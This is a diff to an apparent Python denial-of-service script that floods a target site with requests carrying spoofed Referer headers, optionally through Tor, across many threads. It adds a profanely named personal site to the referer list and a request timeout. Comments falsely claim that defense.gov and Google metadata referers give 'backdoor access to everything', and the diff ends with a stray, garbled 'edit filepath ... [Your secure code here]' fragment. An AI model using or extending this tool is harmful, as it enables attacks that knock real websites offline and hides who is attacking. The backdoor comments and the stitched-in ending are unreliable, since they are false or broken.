@@ -331,6 +331,7 @@ referers = [
     "https://www.defense.gov/About-DOD/Small-Business-Program/", # Backdoor access to everything
     "https://www.defense.gov/About-DOD/Science-Technology/", # Backdoor access to everything
     "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip", # Grab Google Servers and get the IP
+    "https://fuckyou.bigmancozmo.com/", #Personal Webpage Backdoor Access
 ]
 
 def generate_referer():
@@ -344,7 +345,7 @@ def referer_attack():
             proxies = {}
             if USE_TOR:
                 proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
-            requests.get(TARGET, headers={'Referer': referer}, proxies=proxies)
+            requests.get(TARGET, headers={'Referer': referer}, proxies=proxies, timeout=TIMEOUT)
             logging.info(f"\033[34mSent referer: {referer} to {TARGET}\033[0m") # Dark Blue
         except requests.exceptions.RequestException as e:
             logging.error(f"\033[31mRequest error: {e}\033[0m") # Dark Red
@@ -369,5 +370,5 @@ logging.info(f"\033[32mStarting referer attack on {TARGET} with {THREADS} thread
 while True:
     time.sleep(1)
 
-# Add TCP Socket options
-# s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+edit filepath: public/main/ddos/referers.txt
+content: [Your secure code here]
